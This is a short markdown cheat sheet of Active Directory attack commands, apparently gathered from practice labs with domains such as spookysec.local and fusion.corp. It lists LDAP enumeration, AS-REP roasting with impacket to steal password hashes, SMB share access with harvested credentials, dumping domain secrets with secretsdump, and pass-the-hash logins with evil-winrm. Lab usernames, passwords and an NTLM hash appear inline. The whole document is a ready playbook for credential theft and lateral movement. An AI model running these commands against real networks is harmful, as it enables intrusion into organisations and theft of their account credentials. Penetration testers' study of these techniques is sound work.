# Active Directory

## Initial Scans
| Scan Type | Description | Command  |
| -------------------|-----------------------|:----------------------------------------------------------------------|
| LDAP   | Scan LDAP with nmap | `nmap -p 389 -sC -sV $ip` |
| LDAP  | Domain Enumeration | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip"` |
| LDAP  | Get User account description field | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip" | grep description` |

# Steal Hashes
## From Userlist (Check if preauthentication is enabled (If not we can steal hashes))
`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py fusion.corp/ -no-pass -usersfile users.txt -request`
## Single Account (Check if we can get an account password to crack (ticket))
`python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass`
# Enumerate shares with credentials
`smbmap -H spookysec.local -u svc-admin -p management2005 -d spookysec.local`
# Connect to share with creds
`smbclient //$ip/backup -U "svc-admin"`
# Dump Secrets
`secretsdump.py -just-dc backup:backup2517860@spookysec.local`
# Pass the hash
`evil-winrm -i $ip -H 0e0363213e37b94221497260b0bcb4fc --user Administrator`
# Connect using evil-winrm and creds
`evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'`